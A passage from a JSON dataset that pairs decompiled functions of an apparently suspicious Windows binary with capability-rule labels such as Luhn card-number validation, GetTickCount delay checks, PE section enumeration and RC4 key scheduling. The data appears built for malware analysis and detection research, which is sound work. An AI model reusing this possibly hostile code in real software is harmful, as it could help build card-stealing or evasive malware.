        "decompiled_code": "\nvoid fcn.00423fc0(void)\n\n{\n    uint arg_ch;\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    char *var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint32_t var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f70b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042acb0(&var_114h, 0, 0x104, var_10h);\n    fcn.0042acb0(&var_16ch, 0, 0x3c);\n    (**0x469258)(&var_114h, 0x448210);\n    (**0x469258)(&var_114h, 0x4481f4);\n    arg_ch = (**0x4691cc)();\n    puVar1 = fcn.00423f20(&var_130h, arg_ch);\n    var_4h = 0;\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    (**0x469258)(&var_114h, puVar1);\n    var_4h = 0xffffffff;\n    if (0xf < var_11ch) {\n        fcn.0042ac49(var_130h);\n    }\n    puVar1 = &var_114h;\n    var_11ch = 0xf;\n    var_120h = 0;\n    var_130h = var_130h & 0xffffff00;\n    (**0x469258)(puVar1, 0x4481e8);\n    var_158h = &var_114h;\n    var_16ch = 0x3c;\n    var_168h = 0;\n    var_164h = 0;\n    var_160h = 0x446f80;\n    var_15ch = \"HTTPA\";\n    var_154h = 0;\n    var_150h = 0;\n    var_14ch = 0;\n    (**0x4692bc)(&var_16ch);\n    fcn.0042acb0(&var_16ch, 0, 0x3c);\n    fcn.0042acb0(&var_114h, 0, 0x104);\n    (**0x4691bc)(0);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(puVar1);\n    return;\n}\n",
        "token_count": 683
    },
    "00424150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424150(uchar *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint32_t arg_8h_01;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    int32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f758;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar1;\n    if (((*(in_ECX + 0x40) & 2) == 0) && (**(in_ECX + 0x24) != 0)) {\n        uVar2 = **(in_ECX + 0x24);\n        if (uVar2 <= *(in_ECX + 0x3c)) {\n            uVar2 = *(in_ECX + 0x3c);\n        }\n        arg_8h_01 = **(in_ECX + 0x14);\n        arg_8h_00 = uVar2 - arg_8h_01;\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch._1_3_ << 8;\n        fcn.00406270(arg_8h_01, arg_8h_00);\n        var_4h = 0;\n    }\n    else {\n        if (((*(in_ECX + 0x40) & 4) != 0) || (**(in_ECX + 0x20) == 0)) {\n            var_34h = 0xf;\n            var_38h = 0;\n            var_48h = var_48h & 0xffffff00;\n            arg_8h_00 = &var_48h;\n            *(arg_8h + 0x14) = 0xf;\n            *(arg_8h + 0x10) = 0;\n            var_4h = 2;\n            *arg_8h = 0;\n            fcn.004063b0(arg_8h_00);\n            arg_8h_01 = var_48h;\n            uVar2 = var_34h;\n            goto joined_r0x00424245;\n        }\n        arg_8h_01 = **(in_ECX + 0x10);\n        arg_8h_00 = (**(in_ECX + 0x30) + **(in_ECX + 0x20)) - arg_8h_01;\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch._1_3_ << 8;\n        fcn.00406270(arg_8h_01, arg_8h_00);\n        var_4h = 1;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063b0(&var_2ch);\n    uVar2 = var_18h;\njoined_r0x00424245:\n    if (0xf < uVar2) {\n        fcn.0042ac49(arg_8h_01, arg_8h_00, uVar1);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_EBX);\n    return;\n}\n",
        "token_count": 895
    },
    "00424280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00424280(uchar *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    iVar1 = arg_ch[4];\n    puVar2 = arg_ch;\n    if (7 < arg_ch[5]) {\n        puVar2 = *arg_ch;\n    }\n    uVar3 = (**0x4691f0)(0, 0, puVar2, iVar1 + 1, 0, 0, 0, 0);\n    arg_8h_00 = fcn.0042a209(uVar3);\n    if (7 < arg_ch[5]) {\n        arg_ch = *arg_ch;\n    }\n    (**0x4691f0)(0, 0, arg_ch, iVar1 + 1, arg_8h_00, uVar3, 0, 0);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    uVar3 = fcn.0042b420(arg_8h_00);\n    fcn.00406270(arg_8h_00, uVar3);\n    fcn.0042c228(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 324
    },
    "00424320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.00424320(ushort *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_4h;\n    \n    iVar1 = arg_ch[4];\n    puVar2 = arg_ch;\n    if (0xf < arg_ch[5]) {\n        puVar2 = *arg_ch;\n    }\n    uVar3 = (**0x4690cc)(0, 0, puVar2, iVar1 + 1, 0, 0);\n    arg_8h_00 = fcn.0042a209(-(uVar3 * 2 >> 0x20 != 0) | uVar3 * 2);\n    if (0xf < arg_ch[5]) {\n        arg_ch = *arg_ch;\n    }\n    (**0x4690cc)(0, 0, arg_ch, iVar1 + 1, arg_8h_00, uVar3);\n    *(arg_8h + 10) = 7;\n    *(arg_8h + 8) = 0;\n    *arg_8h = 0;\n    arg_ch_00 = fcn.0042e8a3(arg_8h_00);\n    fcn.0041fd20(arg_8h_00, arg_ch_00);\n    fcn.0042c228(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 341
    },
    "00424550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424550(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00424150(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 45
    },
    "00424580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424580(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00424150(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 45
    },
    "004245b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004245b0(uchar *arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint32_t in_stack_ffffff04;\n    int32_t var_dch;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    char *var_c4h;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint32_t var_70h;\n    uint *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f7e6;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    var_34h = arg_8h;\n    *arg_8h = 0;\n    var_dch = 0x44818c;\n    var_cch = 0x448184;\n    var_4h = 1;\n    var_30h = 3;\n    var_7ch = 0x44792c;\n    var_d4h = 0;\n    var_d0h = 0;\n    fcn.00418b50(var_10h);\n    var_44h = &var_c4h;\n    var_40h = 0;\n    var_3ch._0_1_ = fcn.00419b60(0x20);\n    if (var_44h == NULL) {\n        in_stack_ffffff04 = var_70h | 4;\n        fcn.00418a20(in_stack_ffffff04, 0);\n    }\n    *(&var_cch + *(var_cch + 4)) = 0x4480e0;\n    *(&var_dch + *(var_dch + 4)) = \"%USERPROFILE%\";\n    var_4h = 6;\n    *(&var_dch + *(var_dch + 4)) = 0x448164;\n    fcn.004194a0();\n    var_c4h = \"%\";\n    var_88h = 0;\n    var_84h = 0;\n    var_4h = 8;\n    fcn.004226b0(arg_ch);\n    arg_8h_00 = fcn.00424550(&var_2ch);\n    var_4h = CONCAT31(var_4h._1_3_, 9);\n    fcn.004063b0(arg_8h_00);\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.00421bb0();\n    var_7ch = 0x4473d0;\n    fcn.0042a8d9(&var_7ch);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(in_stack_ffffff04);\n    return;\n}\n",
        "token_count": 789
    },
    "00424750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424750(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint uVar2;\n    uint uVar3;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_58h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f83f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar3 = 1;\n    uVar2 = 2;\n    var_4h = 0;\n    var_10h = 0;\n    fcn.004233e0(2, 1);\n    var_4h = 1;\n    fcn.004228a0(arg_ch, uVar2, uVar3, uVar1);\n    fcn.00424580(arg_8h);\n    var_10h = 1;\n    *(&var_a8h + *(var_a8h + 4)) = 0x448134;\n    var_4h = 2;\n    var_a4h = 0x4480f4;\n    fcn.004213b0();\n    fcn.00418c30();\n    *(&var_a8h + *(var_a8h + 4)) = 0x4480e0;\n    var_4h = var_4h & 0xffffff00;\n    var_58h = 0x4473d0;\n    fcn.0042a8d9(&var_58h);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 407
    },
    "00424850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00424850(uint *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    int32_t var_d8h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_a0h;\n    uint var_70h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f884;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    var_10h = 1;\n    fcn.004243d0(arg_ch, 0x20, 0x40, 1);\n    var_4h = 1;\n    fcn.00421b30(0, 0, 2);\n    if ((*(&var_cch + *(var_d8h + 4)) & 6) == 0) {\n        (**(**(&var_a0h + *(var_d8h + 4)) + 0x28))(&var_28h, 0, 0, 1, 1);\n    }\n    else {\n        var_28h = *0x4488e8;\n        var_24h = *0x4488ec;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n    }\n    uVar1 = var_20h + var_28h;\n    if (arg_8h[4] < uVar1) {\n        fcn.0040bc10(uVar1 - arg_8h[4], 0);\n    }\n    else {\n        fcn.00405a90(uVar1, 0xffffffff);\n    }\n    fcn.00421b30(0, 0, 0);\n    puVar2 = arg_8h;\n    if (0xf < arg_8h[5]) {\n        puVar2 = *arg_8h;\n    }\n    fcn.00422a90(puVar2, arg_8h[4], 0);\n    iVar3 = fcn.0041a8f0();\n    if (iVar3 == 0) {\n        uVar1 = *(&var_cch + *(var_d8h + 4));\n        arg_8h_00 = uVar1 | 2;\n        if (*(&var_a0h + *(var_d8h + 4)) == 0) {\n            arg_8h_00 = uVar1 | 6;\n        }\n        fcn.00418a20(arg_8h_00, 0);\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.0041d250();\n    var_70h = 0x4473d0;\n    fcn.0042a8d9(&var_70h);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 777
    },
    "004249d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004249d0(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f8d2;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = in_ECX[1];\n    if ((arg_8h < uVar1) && (uVar2 = *in_ECX,  uVar2 <= arg_8h)) {\n        if (uVar1 == in_ECX[2]) {\n            fcn.0041df40(1);\n        }\n        arg_8h = *in_ECX + ((arg_8h - uVar2) / 0x1c) * 0x1c;\n        puVar3 = in_ECX[1];\n        var_4h = 0;\n        if (puVar3 == NULL) goto code_r0x00424a9b;\n        *(puVar3 + 10) = 7;\n        *(puVar3 + 8) = 0;\n        *puVar3 = 0;\n    }\n    else {\n        if (uVar1 == in_ECX[2]) {\n            fcn.0041df40(1);\n        }\n        puVar3 = in_ECX[1];\n        var_4h = 1;\n        if (puVar3 == NULL) goto code_r0x00424a9b;\n        *(puVar3 + 10) = 7;\n        *(puVar3 + 8) = 0;\n        *puVar3 = 0;\n    }\n    fcn.00412ce0(arg_8h, 0, 0xffffffff);\ncode_r0x00424a9b:\n    in_ECX[1] = in_ECX[1] + 0x1c;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 487
    },
    "00424ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00424ac0(uint *arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    int32_t iVar4;\n    uint arg_ch_01;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint *arg_ch_02;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_26ch;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f92a;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_ch_02 = &arg_ch;\n    arg_8h_00 = &var_48h;\n    var_4h = 1;\n    var_10h = uVar1;\n    puVar2 = fcn.00424320(arg_8h_00, arg_ch_02);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    uVar3 = (**0x440040)(puVar2, &var_298h, arg_8h_00, arg_ch_02, uVar1);\n    if (7 < var_34h) {\n        fcn.0042ac49(var_48h);\n    }\n    var_34h = 7;\n    var_38h = 0;\n    var_48h = var_48h & 0xffff0000;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    var_18h = 7;\n    var_1ch = 0;\n    var_2ch = var_2ch._2_2_ << 0x10;\n    arg_ch_00 = fcn.0042e8a3(&var_26ch);\n    fcn.0041fd20(&var_26ch, arg_ch_00);\n    var_4h._0_1_ = 2;\n    fcn.004249d0(&var_2ch);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    iVar4 = (**0x44003c)(uVar3, &var_298h);\n    while (iVar4 != 0) {\n        var_18h = 7;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffff0000;\n        arg_ch_01 = fcn.0042e8a3(&var_26ch);\n        fcn.0041fd20(&var_26ch, arg_ch_01);\n        var_4h._0_1_ = 3;\n        fcn.004249d0(&var_2ch);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (7 < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n        iVar4 = (**0x44003c)(uVar3, &var_298h);\n    }\n    if (0xf < arg_20h) {\n        fcn.0042ac49(arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_ch_00);\n    return;\n}\n",
        "token_count": 932
    },
    "00425d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425d40(int32_t arg_8h)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = arg_8h + 0x14;\n    iVar2 = 0x11e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = arg_8h + 0x908;\n    iVar2 = 0x1e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = arg_8h + 0xef4;\n    iVar2 = 0x13;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *(arg_8h + 0x414) = 1;\n    *(arg_8h + 0x1af40) = 0;\n    *(arg_8h + 0x1af3c) = 0;\n    *(arg_8h + 0x1af34) = 0;\n    *(arg_8h + 0x1af30) = 0;\n    *(arg_8h + 0x1af2c) = 0;\n    *(arg_8h + 0x1af38) = 0x100;\n    return;\n}\n",
        "token_count": 373
    },
    "00425dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425dd0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    bool bVar10;\n    \n    iVar9 = *(arg_8h + 0x18f8);\n    iVar5 = *(arg_8h + 0x1004 + arg_10h * 4);\n    iVar8 = arg_10h * 2;\n    bVar10 = SBORROW4(iVar8, iVar9);\n    iVar7 = iVar8 - iVar9;\n    if (iVar9 < iVar8) {\n        *(arg_8h + 0x1004 + arg_10h * 4) = iVar5;\n        return;\n    }\n    while( true ) {\n        iVar9 = iVar8;\n        if (bVar10 != iVar7 < 0) {\n            iVar7 = *(arg_8h + 0x1008 + iVar8 * 4);\n            uVar3 = *(arg_ch + iVar7 * 4);\n            uVar4 = *(arg_ch + *(arg_8h + 0x1004 + iVar8 * 4) * 4);\n            if ((uVar3 < uVar4) ||\n               ((uVar3 == uVar4 &&\n                (uVar2 = *(iVar7 + 0x1900 + arg_8h),  puVar1 = *(arg_8h + 0x1004 + iVar8 * 4) + 0x1900 + arg_8h, \n                uVar2 < *puVar1 || uVar2 == *puVar1)))) {\n                iVar9 = iVar8 + 1;\n            }\n        }\n        iVar7 = *(arg_8h + 0x1004 + iVar9 * 4);\n        uVar3 = *(arg_ch + iVar5 * 4);\n        uVar4 = *(arg_ch + iVar7 * 4);\n        if ((uVar3 < uVar4) ||\n           ((uVar3 == uVar4 &&\n            (uVar2 = *(iVar5 + 0x1900 + arg_8h),  puVar1 = iVar7 + 0x1900 + arg_8h,  uVar2 < *puVar1 || uVar2 == *puVar1\n            )))) break;\n        *(arg_8h + 0x1004 + arg_10h * 4) = iVar7;\n        iVar6 = *(arg_8h + 0x18f8);\n        iVar8 = iVar9 * 2;\n        bVar10 = SBORROW4(iVar8, iVar6);\n        iVar7 = iVar8 - iVar6;\n        arg_10h = iVar9;\n        if (iVar6 < iVar8) {\n            *(arg_8h + 0x1004 + iVar9 * 4) = iVar5;\n            return;\n        }\n    }\n    *(arg_8h + 0x1004 + arg_10h * 4) = iVar5;\n    return;\n}\n",
        "token_count": 730
    },
    "00426410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426410(uint *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = arg_8h[0x6bd7];\n    arg_8h[0x6bdb] = arg_8h[0x6bdb] + arg_10h;\n    iVar3 = arg_10h + iVar2;\n    arg_8h[0x6bd7] = iVar3;\n    arg_8h[0x6bd6] = arg_8h[0x6bd6] | arg_ch << (iVar2 & 0x1f);\n    if (0x10 < iVar3) {\n        puVar1 = arg_8h + 0x6bd9;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = *(arg_8h + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + arg_8h[0x6bd8]) = *(arg_8h + 0x1af59);\n        arg_8h[0x6bd7] = arg_8h[0x6bd7] + -0x10;\n        *puVar1 = *puVar1 + 1;\n        arg_8h[0x6bd6] = arg_ch >> (arg_10h - arg_8h[0x6bd7] & 0x1fU);\n    }\n    return;\n}\n",
        "token_count": 418
    },
    "00426980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00426980(int32_t arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = arg_10h;\n    pcVar1 = arg_ch;\n    (*arg_ch)(arg_10h, &var_1h, 1);\n    (*pcVar1)(uVar2, &var_1h, 1);\n    arg_ch = CONCAT13(3, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = CONCAT13(4, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 2) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 3) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x2c) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x2d) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 6) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 7) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 9) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 10) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xb) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xc) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xd) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xe) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xf) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x10) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x11) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x12) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x13) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x14) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x15) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x16) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x17) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x18) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x18) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x1c) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x1c) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    iVar3 = (*pcVar1)(uVar2, arg_8h + 0x148, *(arg_8h + 0x18));\n    if (iVar3 != *(arg_8h + 0x18)) {\n        return 10;\n    }\n    if ((*(arg_8h + 0x1c) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(arg_8h + 0x13c), *(arg_8h + 0x1c)),  iVar3 != *(arg_8h + 0x1c))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 1590
    },
    "00426bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
